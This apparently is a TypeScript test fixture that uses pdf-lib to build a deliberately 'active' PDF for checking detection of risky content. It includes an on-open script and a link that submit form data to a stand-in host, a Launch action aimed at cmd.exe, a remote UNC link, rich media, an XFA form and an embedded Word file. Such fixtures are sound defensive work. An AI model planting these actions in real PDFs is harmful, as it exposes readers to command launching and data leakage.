/**
 * [F-2.1] A PDF that does things: a script on opening, a document-level
 * script, a page trigger, links that launch, submit and open elsewhere, rich
 * media, an XFA form, and a Word document carried inside.
 */

import { PDFArray, PDFDict, PDFDocument, PDFHexString, PDFName, PDFString, type PDFObject } from 'pdf-lib';
import { makeDocx } from '../fixtures.js';

export async function activePdf(): Promise<Uint8Array> {
  const pdf = await PDFDocument.create();
  const page = pdf.addPage([400, 300]);
  page.drawText('Facture');
  const ctx = pdf.context;
  const action = (entries: Record<string, PDFObject>) => ctx.obj(entries);
  const js = (code: string) => action({ S: PDFName.of('JavaScript'), JS: PDFString.of(code) });

  pdf.catalog.set(PDFName.of('OpenAction'), ctx.register(js('app.alert("Bonjour"); this.submitForm("https://collecte.exemple/");')));
  const names = ctx.obj({ JavaScript: ctx.obj({ Names: [PDFString.of('init'), ctx.register(js('var x = util.printd("yyyy", new Date());'))] }) });
  pdf.catalog.set(PDFName.of('Names'), names);
  page.node.set(PDFName.of('AA'), ctx.obj({ O: ctx.register(js('console.println("page ouverte")')) }));

  const link = (a: PDFDict) =>
    ctx.register(ctx.obj({ Type: 'Annot', Subtype: 'Link', Rect: [0, 0, 50, 50], A: a }));
  const annots = ctx.obj([
    link(action({ S: PDFName.of('URI'), URI: PDFString.of('https://exemple.fr/offre') })),
    link(action({ S: PDFName.of('Launch'), F: PDFHexString.fromText('C:\\Windows\\System32\\cmd.exe') })),
    link(action({ S: PDFName.of('SubmitForm'), F: action({ FS: PDFName.of('URL'), F: PDFString.of('https://collecte.exemple/form') }) })),
    link(action({ S: PDFName.of('GoToR'), F: PDFHexString.fromText('\\\\serveur\\partage\\annexe.pdf') })),
    ctx.register(ctx.obj({ Type: 'Annot', Subtype: 'RichMedia', Rect: [0, 0, 10, 10] })),
  ]) as PDFArray;
  page.node.set(PDFName.of('Annots'), annots);
  pdf.catalog.set(PDFName.of('AcroForm'), ctx.obj({ Fields: [], XFA: ctx.register(ctx.flateStream('<xdp:xdp/>')) }));

  await pdf.attach(makeDocx(), 'contrat.docx', { mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' });
  return pdf.save();
}
